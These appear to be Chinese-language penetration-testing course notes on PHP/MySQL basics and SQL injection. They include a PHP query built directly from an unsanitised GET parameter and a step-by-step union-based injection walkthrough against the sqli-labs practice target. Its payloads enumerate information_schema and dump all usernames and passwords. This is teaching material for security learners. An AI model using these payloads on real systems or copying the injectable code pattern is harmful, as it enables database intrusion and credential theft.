# 渗透测试基础06

# 漏洞扫描原理（php文本连接数据库、数据库的增删改查、html+php美化网页、php和数据库结构、漏洞出现原理、使用命令行操作数据库、最基本的SQL注入攻击手法）

## php文本连接数据库

phpstudy，数据库用phpmyadmin图形界面

**新建php文本并连接数据库**

```php
<?php

$servername = "localhost";
$username = "root";
$password = "root";
$dbname = "haha";//数据库名 

// 创建连接
$conn = new mysqli($servername, $username, $password, $dbname); 

// 检测连接
if ($conn->connect_error) {
	die("连接失败: " . $conn->connect_error);
} 
echo "连接成功";

?>
```



数据库创建表并添加索引PRIMARY：

![image-20220108224030585](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220108224030585.png)

通过插入也可以插入数据。



## 数据库的增删改查

**查**

数据库查询(php文本主结构`<?php ?>`里添加)：

```php
//数据库的查语句

//准备一条数据库语句（sql语句）
$sql = "SELECT * FROM table1 WHERE id < 3";

//执行sql语句并且返回给变量
$result = $conn->query($sql); 

//判断result里是否有东西
if ($result->num_rows > 0) 
{    
	// 输出数据
    while($row = $result->fetch_assoc()) 
    {   
    	echo $row['id'].'----->'.$row['username'].'------'.$row['password']."<br/>";    
    }
} else 
{   
	echo "0 结果";
}

```



**增**

```php
//数据库的增语句

$sql = "INSERT INTO table1 (id, username, password)VALUES (10,'test2','haha22222')"; 

if ($conn->query($sql) === TRUE) {
	echo "新记录插入成功";
} else {  
	echo "Error: " . $sql . "<br>" . $conn->error;
}
```



**改**

```php
//数据库的修改语句

$sql = "UPDATE table1 SET password='test55555'WHERE username='test5'"; 

if ($conn->query($sql) === TRUE) {
	echo "数据修改成功";
} else {
	echo "Error: " . $sql . "<br>" . $conn->error;
}
```



**删**

```php
//数据库的删除语句

$sql = "DELETE FROM table1 WHERE username='test2'";

if ($conn->query($sql) === TRUE) {
	echo "数据删除成功";
} else {
	echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();

```



## 美化网页——html和php

```php+HTML
<html>
    <head>
        <title>this is php test haha</title> 
    </head> 
    
    <body>
        
        <?php
        $servername = "localhost";
        $username = "root";
        $password = "root";
        $dbname = "haha";//数据库名
        
        // 创建连接
        $conn = new mysqli($servername, $username, $password, $dbname); 
        // 检测连接
        if ($conn->connect_error) {
            die("连接失败: " . $conn->connect_error);
        } 
        
        //数据库的查询语句
        
        //准备一条数据库语句（sql语句）
        $sql = "SELECT * FROM table1 WHERE id < 12 LIMIT 0,1";
        //执行sql语句并且返回给变量
        $result = $conn->query($sql);
        //判断result里是否有东西
        if ($result->num_rows > 0) 
        {    
            // 输出数据
            echo "<table border='1'>";
            echo "<tr><th>id</th> <th>username</th> </tr>";//输出表框
            while($row = $result->fetch_assoc()) 
            {
                echo "<tr>";//每输出一个内容就有一个横行
                echo "<td>".$row['id']."</td>";
                echo "<td>".$row['username']."</td>";
                echo "</tr>";
            }
            echo "</table>";
        }
        
       
        $conn->close();//关闭数据库
        
        ?>
    </body>
</html>
```



还可进行修改如用GET提交：

```php
		//数据库的查询语句
        $id = $_GET['id'];
        //准备一条数据库语句（sql语句）
        $sql = "SELECT * FROM table1 WHERE id = '$id'";
```





## php和数据库结构

php

GET POST

php+mysql

库名---一张张表---一列列---数据

数据库操作类型：增删改查



## 关于漏洞

漏洞为什么会出现？

——因为和用户有互动。

因为需要调用后端的逻辑代码，甚至需要调用数据库或者操作系统命令




## 使用命令行操作数据库

常用MySQL的软件：

![image-20220108232527820](06 漏洞扫描原理.assets/image-20220108232527820.png)

在此处shift+右键打开命令行窗口，使用mysql.exe

```
mysql.exe -uroot -proot
//输入用户名和密码连接数据库

show databases;
//查看数据库所有库名

use [库名];
//进入某个数据库

show tables;
//查看数据库有多少张表

select * from [表名];
//查看表中所有内容

select * from table where id<13 limit 1,2;

select 1,2,3,4,5;
//自己创建一个表

select * from table where id<13 union select 1,2,3;
//联合查询
```



## 最基本的SQL注入攻击手法



常用SQL注入**靶场**：

http://sqlilabs.njhack.xyz/http://sqlilabs.njhack.xyz/Less-1/



**估算目标**的数据库语法:

```sql
select username,password from table where id=2 limit 0,1;
```



黑客需要破坏数据库语句**目的**是：为了知道数据库的闭合方式。

这个世界上所有的**闭合方式**：

' " () ('x') (('x')) ("x") (("x")) (()) 和没有任何闭合方式的



**猜测**比如： 

`id=2'`

报错：''2'' LIMIT 0,1'

即实际上：'2'' LIMIT 0,1



\ = 转义字符：把后面的第一个东西变成字符串



所以：

`select username,password from table where id=' 2\' limit 0,1`

会导致闭合失败，从而报错，爆出闭合的内容。

所以知道了**闭合方式**是'闭合



**数据库注释符**：

``--``

``/**/``

``#``

``+``相当于空格

那么就可以把后续内容**注释**掉：

`select username,password from table where id=' 2' --+ ' limit 0,1`

即：`select username,password from table where id=' 2'`



**确定有多少个栏目**

`id=2' order by [数字] --+`

完整即：

`select id,username,password from table where id=' 2' order by 10 --+`

发现`order by 3`正常

说明他数据库里有3个栏目



**显示报错位**

`select id,username,password from table where id=' -2' union select 1,2,3 --+ ' limit 0,1`

`id=-2' union select 1,2,3 --+`发现报错位是2,3



**查看数据库的库名**

`id=-2' union select 1,database(),3 --+`

库名是`security`



**根据库名找到表名**

`id=-2' union select 1,table_name,3 from information_schema.tables where table_schema = 'security' limit 0,1 --+`

查到表名`emails，referers，uagents，users`



**根据表名找到列名**

黑客觉得`users`里面的数据很有价值

`id=-2' union select 1,column_name,3 from information_schema.columns where table_schema = 'security' and table_name = 'users' limit 0,1 --+`

发现`users`里有`id，username，password`



黑客需要拿到所有的`username`和`password`的值

`id=-2' union select 1,group_concat(username),group_concat(password) from users  --+`




